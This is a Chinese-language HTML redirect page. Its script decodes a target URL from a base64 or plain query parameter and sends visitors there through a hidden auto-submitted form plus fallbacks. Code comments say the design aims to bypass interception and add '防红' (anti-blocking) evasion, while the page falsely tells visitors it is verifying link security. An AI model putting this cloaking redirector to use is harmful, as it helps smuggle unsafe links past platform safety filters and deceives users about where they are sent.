<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>安全访问中</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background: #f5f7fa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 90%;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(0,0,0,0.1);
            border-top-color: #3498db;
            border-radius: 50%;
            margin: 0 auto 20px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        #status {
            font-size: 18px;
            color: #333;
            margin-bottom: 20px;
        }
        #manualRedirect {
            display: none;
            margin-top: 20px;
        }
    </style>
    <script>
        // 安全解析URL参数
        function getTargetUrl() {
            const params = new URLSearchParams(location.search);
            try {
                // 1. 尝试Base64解码
                const base64 = params.get('c');
                if (base64) {
                    const decoded = atob(base64.replace(/-/g, '+').replace(/_/g, '/'));
                    if (/^https?:\/\//i.test(decoded)) return decoded;
                }
                
                // 2. 尝试直接参数
                const directUrl = params.get('redirect') || params.get('u');
                if (directUrl && /^https?:\/\//i.test(directUrl)) return directUrl;
            } catch (e) {
                console.error("解析失败:", e);
            }
            return null;
        }

        // 终极跳转方案
        function ultimateRedirect(url) {
            // 方法1: 动态创建不可见表单提交（绕过大多数拦截）
            const form = document.createElement('form');
            form.action = url;
            form.method = 'POST';
            form.style.display = 'none';
            
            // 添加随机参数
            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = 't';
            input.value = Date.now();
            form.appendChild(input);
            
            document.body.appendChild(form);
            form.submit();

            // 方法2: 双保险跳转（如果表单提交失败）
            setTimeout(() => {
                location.href = url + (url.includes('?') ? '&' : '?') + 't=' + Date.now();
            }, 300);
        }

        // 页面加载后执行
        document.addEventListener('DOMContentLoaded', () => {
            const targetUrl = getTargetUrl();
            if (targetUrl) {
                document.title = "正在跳转到安全页面...";
                
                // 延迟执行增加防红效果
                setTimeout(() => {
                    ultimateRedirect(targetUrl);
                    
                    // 如果仍未跳转，显示手动跳转按钮
                    setTimeout(() => {
                        const btn = document.createElement('button');
                        btn.textContent = '点击手动跳转';
                        btn.onclick = () => ultimateRedirect(targetUrl);
                        btn.style.padding = '10px 20px';
                        btn.style.background = '#3498db';
                        btn.style.color = 'white';
                        btn.style.border = 'none';
                        btn.style.borderRadius = '5px';
                        btn.style.cursor = 'pointer';
                        document.getElementById('manualRedirect').appendChild(btn);
                        document.getElementById('manualRedirect').style.display = 'block';
                    }, 2000);
                }, 800);
            } else {
                document.getElementById('status').textContent = "错误：无效的跳转链接";
            }
        });
    </script>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <div id="status">正在验证链接安全性...</div>
        <div id="manualRedirect"></div>
    </div>
</body>
</html>
